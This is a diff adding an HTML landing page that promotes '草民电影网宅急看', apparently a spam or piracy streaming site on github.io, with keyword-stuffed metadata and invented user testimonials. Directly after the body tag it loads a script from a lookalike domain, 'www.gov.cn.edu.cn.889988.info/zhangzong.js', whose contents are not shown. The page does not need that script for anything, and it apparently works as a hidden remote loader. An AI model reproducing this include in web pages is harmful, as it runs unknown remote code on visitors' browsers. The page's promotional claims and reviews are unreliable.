@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>草民电影网宅急看｜宅家追剧看片首选，最新电影电视剧免费在线播放</title>
+<meta name="keywords" content="草民电影网宅急看, caomindianyingwangzhaijikan-zh, 宅家看电影, 草民电影网, 宅急看影视, 免费在线播放, 最新电影, 热播电视剧, 高清影视资源">
+<meta name="description" content="草民电影网宅急看（caomindianyingwangzhaijikan-zh）是专为宅家追剧一族打造的影视在线观看平台，最新院线电影、热播剧集、综艺动漫一网打尽，高清流畅播放、更新快、资源全。官方网站地址：https://caomindianyingwangzhaijikan-zh.github.io，宅家看片就上草民电影网宅急看。">
+<meta name="robots" content="index,follow">
+<meta name="language" content="zh-CN">
+<meta name="geo.region" content="CN">
+<meta property="og:title" content="草民电影网宅急看 - 宅家追剧看片首选">
+<meta property="og:description" content="最新电影、热播电视剧、综艺动漫免费高清在线播放，官网：https://caomindianyingwangzhaijikan-zh.github.io">
+<meta property="og:url" content="https://caomindianyingwangzhaijikan-zh.github.io/">
+<meta property="og:type" content="website">
+<link rel="canonical" href="https://caomindianyingwangzhaijikan-zh.github.io/">
+<style>
+:root{
+  --brand:#ff6a2a;--brand-d:#e64e10;--brand-l:#fff1e8;
+  --ink:#2a1c16;--muted:#7a6a62;--bg:#fdf9f6;--white:#fff;
+  --shadow:0 10px 30px rgba(255,106,42,.14);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;font-size:16px;
+}
+a{color:inherit;text-decoration:none;transition:.22s}
+ul{list-style:none}
+img{max-width:100%;display:block}
+
+/* 顶部通告 */
+.announce{
+  background:linear-gradient(90deg,#2a1c16,#4a3226);color:#ffd9c4;font-size:13.5px;
+  padding:9px 0;text-align:center;letter-spacing:.3px
+}
+.announce b{color:#ff8a50}
+
+/* 导航 */
+header{background:var(--white);box-shadow:0 3px 18px rgba(0,0,0,.06);position:sticky;top:0;z-index:99}
+.nav-in{
+  max-width:1200px;margin:0 auto;padding:13px 22px;
+  display:flex;align-items:center;justify-content:space-between;gap:18px
+}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .badge{
+  width:44px;height:44px;border-radius:14px;background:var(--brand);color:#fff;
+  display:grid;place-items:center;font-size:17px;font-weight:900;box-shadow:var(--shadow)
+}
+.logo h1{font-size:20px;font-weight:900;letter-spacing:.5px}
+.logo h1 small{display:block;font-size:10.5px;font-weight:500;color:var(--muted);letter-spacing:2px;margin-top:1px}
+.menu{display:flex;align-items:center;gap:2px}
+.menu a{padding:9px 14px;border-radius:9px;font-size:15px;color:var(--muted);font-weight:600}
+.menu a:hover{background:var(--brand-l);color:var(--brand-d)}
+.menu .live{
+  background:var(--brand);color:#fff;padding:8px 16px;border-radius:20px;font-weight:700;margin-left:8px
+}
+.menu .live:hover{background:var(--brand-d);color:#fff}
+.burger{display:none;width:38px;height:38px;border:none;background:var(--brand-l);border-radius:9px;cursor:pointer;position:relative}
+.burger i{position:absolute;left:9px;width:20px;height:2px;background:var(--brand-d);border-radius:2px}
+.burger i:nth-child(1){top:12px}.burger i:nth-child(2){top:18px}.burger i:nth-child(3){top:24px}
+
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+section{padding:76px 0}
+.kicker{
+  font-size:12px;font-weight:800;letter-spacing:3px;color:var(--brand-d);
+  text-transform:uppercase;margin-bottom:8px
+}
+h2.stitle{font-size:clamp(25px,3.8vw,38px);font-weight:900;line-height:1.28;margin-bottom:14px}
+.sub{color:var(--muted);max-width:620px;font-size:16px}
+.center{text-align:center}.center .sub{margin:0 auto}
+
+/* Hero */
+.hero{background:radial-gradient(circle at 82% 18%,#ffe3d2 0,transparent 42%),radial-gradient(circle at 12% 88%,#ffd9c4 0,transparent 38%),var(--bg);padding:64px 0 84px}
+.hero-box{
+  background:var(--white);border-radius:26px;box-shadow:var(--shadow);
+  display:grid;grid-template-columns:1.1fr .9fr;overflow:hidden;border:1px solid #f3e4d8
+}
+.hero-main{padding:48px 44px}
+.hero-main h2{font-size:clamp(29px,4.6vw,50px);font-weight:900;line-height:1.22;margin-bottom:18px}
+.hero-main h2 em{font-style:normal;color:var(--brand);position:relative;white-space:nowrap}
+.hero-main h2 em::after{content:"";position:absolute;left:0;bottom:2px;width:100%;height:9px;background:rgba(255,106,42,.2);z-index:-1}
+.hero-main p{color:var(--muted);font-size:16.5px;margin-bottom:22px;max-width:480px}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:26px}
+.btn{
+  display:inline-block;padding:13px 30px;border-radius:11px;font-weight:700;font-size:15px;
+  border:2px solid transparent;cursor:pointer
+}
+.btn-o{background:var(--brand);color:#fff}
+.btn-o:hover{background:var(--brand-d);transform:translateY(-2px);box-shadow:var(--shadow)}
+.btn-g{background:transparent;border-color:var(--brand);color:var(--brand-d)}
+.btn-g:hover{background:var(--brand-l)}
+.linkchip{
+  display:inline-flex;flex-wrap:wrap;align-items:center;gap:9px;
+  background:var(--brand-l);border-radius:11px;padding:11px 16px;font-size:14.5px
+}
+.linkchip code{color:var(--brand-d);font-weight:800;word-break:break-all}
+.hero-side{background:linear-gradient(160deg,#ff6a2a,#ff9450);color:#fff;padding:48px 40px;position:relative;overflow:hidden}
+.hero-side::before{content:"🍿";position:absolute;right:-12px;bottom:-26px;font-size:150px;opacity:.14}
+.hero-side .lab{font-size:12px;letter-spacing:2px;opacity:.9}
+.hero-side h3{font-size:22px;margin:8px 0 22px}
+.vibe{display:grid;grid-template-columns:1fr 1fr;gap:16px;position:relative;z-index:1}
+.vibe div{background:rgba(255,255,255,.17);border-radius:13px;padding:16px;text-align:center;backdrop-filter:blur(3px)}
+.vibe b{display:block;font-size:23px;font-weight:900}
+.vibe span{font-size:12.5px;opacity:.92}
+
+/* 栏目导航 */
+.blocks{display:grid;grid-template-columns:repeat(6,1fr);gap:14px}
+.blk{
+  background:var(--white);border:1px solid #f1e4dc;border-radius:16px;padding:22px 12px;
+  text-align:center;transition:.28s;cursor:pointer
+}
+.blk:hover{border-color:var(--brand);transform:translateY(-5px);box-shadow:var(--shadow)}
+.blk .ico{font-size:28px;margin-bottom:8px}
+.blk h4{font-size:15px;margin-bottom:4px}
+.blk p{font-size:12px;color:var(--muted)}
+
+/* 栏目卡片 - 交错大图 */
+.grid2{display:grid;grid-template-columns:repeat(2,1fr);gap:26px}
+.show{
+  background:var(--white);border-radius:20px;overflow:hidden;border:1px solid #f3e7e0;
+  display:grid;grid-template-columns:200px 1fr;transition:.3s
+}
+.show:hover{border-color:var(--brand);box-shadow:var(--shadow);transform:translateY(-4px)}
+.show .cvr{
+  display:grid;place-items:center;font-size:52px;color:#fff;min-height:180px
+}
+.show .cvr.c1{background:linear-gradient(135deg,#ff6a2a,#ff9450)}
+.show .cvr.c2{background:linear-gradient(135deg,#7b61ff,#5a44d4)}
+.show .cvr.c3{background:linear-gradient(135deg,#19a974,#0e7c58)}
+.show .cvr.c4{background:linear-gradient(135deg,#f5b730,#e08a1e)}
+.show .meta{padding:22px}
+.show .lbl{font-size:11px;font-weight:800;letter-spacing:1px;color:var(--brand-d);background:var(--brand-l);padding:3px 10px;border-radius:20px;display:inline-block;margin-bottom:9px}
+.show h3{font-size:19px;margin-bottom:7px}
+.show p{font-size:14px;color:var(--muted)}
+.show .more{display:inline-block;margin-top:12px;color:var(--brand-d);font-weight:700;font-size:14px}
+
+/* 特色三段 */
+.trio{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.trio .t{
+  background:var(--white);border-radius:18px;padding:0 0 26px;border:1px solid #f1e4dc;
+  overflow:hidden;transition:.28s
+}
+.trio .t:hover{border-color:var(--brand);transform:translateY(-6px);box-shadow:var(--shadow)}
+.trio .band{height:6px;background:var(--brand)}
+.trio .band.b2{background:#7b61ff}.trio .band.b3{background:#19a974}
+.trio .pad{padding:24px 24px 0}
+.trio .num{font-size:38px;font-weight:900;color:var(--brand-l);line-height:1}
+.trio.b2 .num{color:#eee9ff}.trio.b3 .num{color:#e6f7f0}
+.trio h3{font-size:19px;margin:12px 0 9px}
+.trio p{font-size:14px;color:var(--muted)}
+
+/* 域名名片 */
+.namecard{
+  background:var(--ink);color:#ffe3d2;border-radius:24px;padding:46px;
+  display:grid;grid-template-columns:1.3fr .7fr;gap:40px;align-items:center;
+  background-image:radial-gradient(circle at 88% 20%,rgba(255,106,42,.25),transparent 40%)
+}
+.namecard h3{font-size:clamp(22px,3.2vw,32px);margin-bottom:12px}
+.namecard p{color:#cbb5a8;font-size:15px;max-width:500px}
+.siteurl{
+  background:rgba(255,255,255,.07);border:1.5px dashed var(--brand);border-radius:16px;
+  padding:22px;text-align:center
+}
+.siteurl small{color:#cbb5a8;font-size:12px;letter-spacing:1px}
+.siteurl b{display:block;color:#ff8a50;font-size:16px;margin-top:9px;word-break:break-all;line-height:1.5}
+
+/* 评论/口碑 */
+.voices{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.voice{
+  background:var(--white);border-radius:16px;padding:24px;border:1px solid #f1e4dc;position:relative;
+  transition:.25s
+}
+.voice:hover{border-color:var(--brand);box-shadow:var(--shadow)}
+.voice::before{content:""";position:absolute;top:-6px;left:14px;font-size:50px;color:var(--brand);font-family:Georgia,serif;line-height:1}
+.voice p{font-size:14.5px;color:var(--ink);margin-top:12px}
+.voice .who{margin-top:16px;padding-top:14px;border-top:1px dashed #eee2d9;font-size:13px;color:var(--muted)}
+.voice .who b{color:var(--brand-d)}
+
+/* 步骤 */
+.how{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.step{
+  background:var(--white);border-radius:16px;padding:24px;border-top:4px solid var(--brand);
+  transition:.28s
+}
+.step:hover{box-shadow:var(--shadow);transform:translateY(-5px)}
+.step:nth-child(2){border-top-color:#7b61ff}
+.step:nth-child(3){border-top-color:#19a974}
+.step:nth-child(4){border-top-color:#f5b730}
+.step .sn{font-size:13px;font-weight:800;color:var(--brand);letter-spacing:1px}
+.step h4{font-size:17px;margin:8px 0 7px}
+.step p{font-size:13.5px;color:var(--muted)}
+
+/* 页脚 */
+footer{background:#2a1c16;color:#cbb5a8;padding:60px 0 26px}
+.foot{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:34px;margin-bottom:36px}
+.foot h5{color:#fff;font-size:15px;margin-bottom:14px}
+.foot a{display:block;color:#a89082;padding:5px 0;font-size:14px}
+.foot a:hover{color:var(--brand)}
+.foot-brand p{color:#a89082;font-size:14px;margin-top:12px;max-width:330px}
+.fbot{
+  border-top:1px solid rgba(255,255,255,.1);padding-top:22px;
+  display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:13px;color:#8d7466
+}
+.fbot b{color:var(--brand)}
+
+@media(max-width:980px){
+  .hero-box,.namecard,.show{grid-template-columns:1fr}
+  .show .cvr{min-height:120px;font-size:42px}
+  .grid2,.trio,.voices{grid-template-columns:1fr 1fr}
+  .blocks{grid-template-columns:repeat(3,1fr)}
+  .how,.foot{grid-template-columns:1fr 1fr}
+}
+@media(max-width:600px){
+  section{padding:54px 0}
+  .burger{display:block}
+  .menu{
+    position:fixed;top:0;right:-100%;width:78%;max-width:300px;height:100vh;background:var(--white);
+    flex-direction:column;align-items:stretch;padding:68px 18px 28px;gap:2px;
+    box-shadow:-8px 0 30px rgba(0,0,0,.1);transition:.32s
+  }
+  .menu.open{right:0}
+  .menu a{padding:13px 14px;border-radius:9px;border-bottom:1px solid #f7eeea}
+  .menu .live{margin:10px 0 0;text-align:center}
+  .hero-main{padding:34px 24px}
+  .hero-side{padding:36px 28px}
+  .grid2,.trio,.voices,.blocks,.how,.foot{grid-template-columns:1fr}
+  .namecard{padding:30px 24px}
+  .vibe{grid-template-columns:1fr 1fr}
+  .hero-btns .btn{width:100%;text-align:center}
+  .announce{font-size:12px}
+  .logo h1{font-size:17px}
+  .fbot{flex-direction:column;text-align:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="announce">
+  草民电影网宅急看 · 宅家看片不将就 🍿 最新院线电影 &amp; 热播剧集持续更新，官方网站：<b>https://caomindianyingwangzhaijikan-zh.github.io</b>
+</div>
+
+<header>
+  <div class="nav-in">
+    <div class="logo">
+      <div class="badge">草</div>
+      <h1>草民电影网宅急看<small>CAOMIN · ZHAIJIKAN</small></h1>
+    </div>
+    <button class="burger" aria-label="菜单" onclick="document.getElementById('m').classList.toggle('open')"><i></i><i></i><i></i></button>
+    <nav class="menu" id="m">
+      <a href="#top">首页</a>
+      <a href="#nav">内容频道</a>
+      <a href="#feat">宅家特色</a>
+      <a href="#pick">编辑精选</a>
+      <a href="#voice">用户口碑</a>
+      <a href="#how">观影步骤</a>
+      <a href="#about">关于本站</a>
+      <a href="#" class="live">🔴 立即看片</a>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <div class="hero-box">
+      <div class="hero-main">
+        <div class="kicker">宅家观影 · 随开随看</div>
+        <h2>不想出门？<br>上<em>草民电影网宅急看</em><br>好片立刻送到眼前</h2>
+        <p>一部手机、一台电脑，躺着就能追最新电影、热播剧、综艺动漫。宅家看片这件事，草民电影网宅急看做到了快、全、稳。</p>
+        <div class="hero-btns">
+          <a class="btn btn-o" href="#nav">浏览内容频道</a>
+          <a class="btn btn-g" href="#how">怎么看片？</a>
+        </div>
+        <div class="linkchip">🌐 官网直达 <code>https://caomindianyingwangzhaijikan-zh.github.io</code></div>
+      </div>
+      <div class="hero-side">
+        <div class="lab">CAOMIN ZHAIJIKAN</div>
+        <h3>宅家观影新选择</h3>
+        <div class="vibe">
+          <div><b>快</b><span>更新及时</span></div>
+          <div><b>全</b><span>类型丰富</span></div>
+          <div><b>稳</b><span>播放流畅</span></div>
+          <div><b>省</b><span>看片轻松</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目导航 -->
+<section id="nav" style="padding-top:20px">
+  <div class="wrap">
+    <div class="center" style="margin-bottom:38px">
+      <div class="kicker">Content Channels</div>
+      <h2 class="stitle">六大内容频道，宅家看片不再挑花眼</h2>
+      <p class="sub">草民电影网宅急看按内容类型分门别类，动作、爱情、悬疑、综艺、动漫随你挑</p>
+    </div>
+    <div class="blocks">
+      <div class="blk"><div class="ico">🎬</div><h4>院线电影</h4><p>动作·喜剧·悬疑</p></div>
+      <div class="blk"><div class="ico">📺</div><h4>热播剧集</h4><p>国产·韩剧·美剧</p></div>
+      <div class="blk"><div class="ico">🎤</div><h4>综艺节目</h4><p>真人秀·脱口秀</p></div>
+      <div class="blk"><div class="ico">🎨</div><h4>动漫番剧</h4><p>国漫·日漫</p></div>
+      <div class="blk"><div class="ico">📽️</div><h4>经典老片</h4><p>怀旧·高分</p></div>
+      <div class="blk"><div class="ico">⭐</div><h4>编辑精选</h4><p>口碑·榜单</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 编辑精选 -->
+<section id="pick" style="background:var(--white)">
+  <div class="wrap">
+    <div class="center" style="margin-bottom:42px">
+      <div class="kicker">Editor's Pick</div>
+      <h2 class="stitle">编辑精选 · 草民电影网宅急看强推片单</h2>
+      <p class="sub">宅家不知道看什么？这份片单帮你省下挑片时间</p>
+    </div>
+    <div class="grid2">
+      <div class="show">
+        <div class="cvr c1">🚀</div>
+        <div class="meta">
+          <span class="lbl">院线新片</span>
+          <h3>星际归途 2026</h3>
+          <p>科幻冒险巨制，宏大宇宙世界观搭配硬核视效，宅家也能感受大银幕级别的震撼。</p>
+          <a class="more" href="#">查看详情 →</a>
+        </div>
+      </div>
+      <div class="show">
+        <div class="cvr c2">🕵️</div>
+        <div class="meta">
+          <span class="lbl">热播剧集</span>
+          <h3>沉默的证人</h3>
+          <p>高能悬疑推理剧，每集一个反转，宅家连刷根本停不下来。</p>
+          <a class="more" href="#">查看详情 →</a>
+        </div>
+      </div>
+      <div class="show">
+        <div class="cvr c3">🏔️</div>
+        <div class="meta">
+          <span class="lbl">高分纪录片</span>
+          <h3>深蓝：海洋日记</h3>
+          <p>自然纪录片佳作，4K 极致画质呈现深海奇观，宅家沉浸式观影体验。</p>
+          <a class="more" href="#">查看详情 →</a>
+        </div>
+      </div>
+      <div class="show">
+        <div class="cvr c4">🎤</div>
+        <div class="meta">
+          <span class="lbl">综艺娱乐</span>
+          <h3>周末音浪计划</h3>
+          <p>音乐竞演真人秀，每周更新，宅家周末的最佳下饭综艺选择。</p>
+          <a class="more" href="#">查看详情 →</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 宅家特色 -->
+<section id="feat" style="background:var(--bg)">
+  <div class="wrap">
+    <div class="center" style="margin-bottom:42px">
+      <div class="kicker">Why Us</div>
+      <h2 class="stitle">草民电影网宅急看 · 宅家看片三大理由</h2>
+      <p class="sub">为什么越来越多宅家追剧党选择我们？三个关键词说清楚</p>
+    </div>
+    <div class="trio">
+      <div class="t">
+        <div class="band"></div>
+        <div class="pad">
+          <div class="num">01</div>
+          <h3>更新快，宅家不断粮</h3>
+          <p>院线新片、热播剧集第一时间上线，告别等更新的焦虑，宅家追剧天天有新鲜内容。</p>
+        </div>
+      </div>
+      <div class="t">
+        <div class="band b2"></div>
+        <div class="pad">
+          <div class="num">02</div>
+          <h3>类型全，想看就有</h3>
+          <p>电影、电视剧、综艺、动漫、纪录片全覆盖，从热血动作到治愈温情，宅家看片不重样。</p>
+        </div>
+      </div>
+      <div class="t">
+        <div class="band b3"></div>
+        <div class="pad">
+          <div class="num">03</div>
+          <h3>播放稳，宅家不卡顿</h3>
+          <p>多画质自适应播放，手机、电脑、平板全端流畅观影，宅家躺着看也不掉链子。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 域名名片 -->
+<section id="about" style="background:var(--bg)">
+  <div class="wrap">
+    <div class="namecard">
+      <div>
+        <div class="kicker" style="color:#ff8a50">About Us</div>
+        <h3>关于草民电影网宅急看</h3>
+        <p>草民电影网宅急看（caomindianyingwangzhaijikan-zh）是一个专注影视内容聚合与在线观看的宅家观影平台。我们相信，好电影不该被距离和门槛挡住——宅在家里，打开官网，好片立刻送到眼前。最新电影、热播剧集、综艺动漫持续更新，让每一次宅家时光都过得有滋有味。</p>
+      </div>
+      <div class="siteurl">
+        <small>🌐 官方唯一网址</small>
+        <b>https://caomindianyingwangzhaijikan-zh.github.io</b>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 用户口碑 -->
+<section id="voice" style="background:var(--white)">
+  <div class="wrap">
+    <div class="center" style="margin-bottom:42px">
+      <div class="kicker">User Voices</div>
+      <h2 class="stitle">宅家观众怎么说</h2>
+      <p class="sub">真实用户口碑，看看大家为什么选择草民电影网宅急看</p>
+    </div>
+    <div class="voices">
+      <div class="voice">
+        <p>周末宅家不知道看什么，打开草民电影网宅急看就能找到想看的，类型分得很清楚，挑片省时间。</p>
+        <div class="who"><b>小陈</b> · 上班族 · 宅家追剧党</div>
+      </div>
+      <div class="voice">
+        <p>更新速度挺让人满意，热播剧基本同步上线，躺在沙发上就能追，宅家幸福感直接拉满。</p>
+        <div class="who"><b>阿May</b> · 学生党 · 影视爱好者</div>
+      </div>
+      <div class="voice">
+        <p>综艺和纪录片资源都很全，周末宅家一边吃东西一边看，就是这个感觉。</p>
+        <div class="who"><b>老周</b> · 自由职业 · 纪录片迷</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 观影步骤 -->
+<section id="how" style="background:var(--bg)">
+  <div class="wrap">
+    <div class="center" style="margin-bottom:42px">
+      <div class="kicker">How To Watch</div>
+      <h2 class="stitle">宅家看片四步走，简单到不需要教程</h2>
+      <p class="sub">在草民电影网宅急看看片，只需四步，打开就能看</p>
+    </div>
+    <div class="how">
+      <div class="step"><div class="sn">STEP 01</div><h4>打开官网</h4><p>访问草民电影网宅急看官方网站</p></div>
+      <div class="step"><div class="sn">STEP 02</div><h4>挑选频道</h4><p>电影 / 剧集 / 综艺 / 动漫任选</p></div>
+      <div class="step"><div class="sn">STEP 03</div><h4>点开播放</h4><p>选中影片即可流畅在线观看</p></div>
+      <div class="step"><div class="sn">STEP 04</div><h4>收藏网址</h4><p>收藏官网，宅家随时回来追</p></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="foot-brand">
+        <div class="logo">
+          <div class="badge">草</div>
+          <h1 style="font-size:18px;color:#fff">草民电影网宅急看</h1>
+        </div>
+        <p>宅家看片不将就。最新电影、热播剧集、综艺动漫持续更新，让每一次宅家时光都过得有滋有味。</p>
+      </div>
+      <div>
+        <h5>内容频道</h5>
+        <a href="#nav">院线电影</a>
+        <a href="#nav">热播剧集</a>
+        <a href="#nav">综艺节目</a>
+        <a href="#nav">动漫番剧</a>
+      </div>
+      <div>
+        <h5>关于本站</h5>
+        <a href="#about">关于我们</a>
+        <a href="#how">观影指南</a>
+        <a href="#voice">用户口碑</a>
+        <a href="#">意见反馈</a>
+      </div>
+      <div>
+        <h5>联系方式</h5>
+        <a href="#">商务合作</a>
+        <a href="#">内容投稿</a>
+        <a href="#">帮助中心</a>
+        <a href="#">隐私说明</a>
+      </div>
+    </div>
+    <div class="fbot">
+      <span>© 2026 草民电影网宅急看（caomindianyingwangzhaijikan-zh） 版权所有</span>
+      <span>官方网站：<b>https://caomindianyingwangzhaijikan-zh.github.io</b></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('.menu a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('m').classList.remove('open')});
+});
+</script>
+</body>
+</html>
